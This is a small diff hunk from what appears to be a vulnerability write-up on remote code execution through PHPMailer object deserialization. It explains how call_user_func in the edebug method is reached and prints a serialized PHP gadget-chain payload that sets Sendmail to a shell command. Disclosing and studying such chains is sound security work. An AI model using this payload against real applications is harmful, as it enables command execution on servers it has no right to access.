@@ -57,7 +57,7 @@ $this→smtp\_conn is reference to $this→writer property in serialized string.
 
 ![](./images/phpmailer_unserialize_rce_0day_html_d1abe01062b81bd3.png)
 
-Execute method of any object using **call\_user\_func** in "edebug" method. Set $this→Debugoutput with array in serialized string.\
+Execute method of any object using **call\_user\_func** in "edebug" method. Set $this→Debugoutput with array in serialized string.
 
 <pre>s:11:"Debugoutput";a:2:{i:0;O:29:"PHPMailer\\PHPMailer\\PHPMailer":2:{s:6:"Mailer";s:8:"sendmail";s:8:"Sendmail";s:22:"/bin/sh -c "uname -sp"";}i:1;s:8:"postSend";}}}</pre>
 
